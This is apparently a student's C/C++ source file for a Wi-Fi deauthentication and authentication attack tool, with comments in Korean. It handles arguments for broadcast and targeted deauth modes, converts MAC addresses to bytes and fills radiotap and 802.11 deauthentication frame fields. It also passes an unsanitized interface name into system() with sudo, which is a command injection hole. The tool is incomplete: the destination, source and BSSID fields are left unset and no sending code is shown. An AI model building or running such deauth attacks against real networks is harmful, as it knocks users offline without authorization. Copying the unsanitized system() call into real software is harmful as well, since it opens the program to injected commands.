#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "attack_frame.h"

int choose_deauth(int argc, char * argv[])
{
    switch(argc) {

        // 입력값 부족
        case 2:
            fprintf(stderr, "Usage: %s or <interface> or <ap_mac>\n", argv[0]);
            return 1;

        //올바른 맥값 넣었는지 검증필요(추후구현)

        // 브로드캐스트
        case 3:
            printf("---------Deauth-Attack---------\n");
            printf("<Broadcast>\n");
            return 2;

        
        case 4:
            // auth 공격
            if(strcmp(argv[3], "-auth")==0)
            {
                printf("----------Auth-Attack----------\n");
                printf("Go to <ap_mac>: %s\n", argv[2]);
                return 4;
            }

            // 양쪽 전송
            else
            {
                printf("---------Deauth-Attack---------\n");
                printf("<ap_mac>: %s -> <station_mac>: %s \n", argv[2], argv[3]);
                printf("<station_mac>: %s -> <ap_mac>: %s \n", argv[3], argv[2]);
                return 3;
            }

        
        // 초과 입력
        default:
            fprintf(stderr, "Less Input Please!\n");
            return 5;
    }
}

// 맥주소 리틀앤디안으로
void convert_mac_address(const char* mac_str, char* mac_bytes) {
     int values[6];
    sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    
    // 변환된 MAC 주소를 바이트 배열에 저장
    for(int i = 0; i < 6; ++i) {
        mac_bytes[i] = (uint8_t)values[i];
    }
}

// 채우는 거
void fill_frame(Deauthentication_Frame & frame)
{
    frame.radiotap_header.header_revision = 0;
    frame.radiotap_header.header_pad = 0;
    frame.radiotap_header.header_length = 0x0018;
    frame.radiotap_header.present_flags[0] = 0xa000402e;
    frame.radiotap_header.present_flags[1] = 0x00000820;
    frame.radiotap_header.flags= 0x00;
    frame.radiotap_header.data_rate=0x02;
    frame.radiotap_header.channel_frequency=0x099e;
    frame.radiotap_header.channel_flags=0x00a0;
    frame.radiotap_header.antenna_signal1=0xa5;
    frame.radiotap_header.empty_field=0;
    frame.radiotap_header.rx_flags=0x0000;
    frame.radiotap_header.antenna_signal2= 0xa5;
    frame.radiotap_header.antenna=0x00;

    frame.deauthentication_main_frame.frame_control_field=0x08c0;
    frame.deauthentication_main_frame.duration=0x013a;
    // 채워야할 값 frame.deauthentication_main_frame.destination_address=
    // 채워야할 값 frame.deauthentication_main_frame.source_address=
    // frame.deauthentication_main_frame.bss_id=
    frame.deauthentication_main_frame.fragment_sequence=0x2290;
    frame.wireless_management.reason_code = 0x0006;

}

// 모니터 모드 자동 실행
void start_monitor_mode(char *interface) {
    char command[100];
    sprintf(command, "sudo gmon %s", interface);
    system(command);
}